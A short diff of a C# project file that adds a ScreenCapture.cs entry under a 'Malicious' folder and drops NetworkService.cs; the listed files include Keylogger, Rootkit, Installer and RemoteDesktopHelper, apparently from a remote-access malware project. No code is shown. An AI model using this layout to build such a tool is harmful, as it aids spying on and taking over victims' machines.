@@ -78,9 +78,9 @@
     <Compile Include="Malicious\Installer.cs" />
     <Compile Include="Malicious\Keylogger.cs" />
     <Compile Include="Malicious\MaliciousManager.cs" />
+    <Compile Include="Malicious\ScreenCapture.cs" />
     <Compile Include="Malicious\Rootkit.cs" />
     <Compile Include="MasterServer.cs" />
-    <Compile Include="NetworkService.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="Helper\RemoteDesktopHelper.cs" />
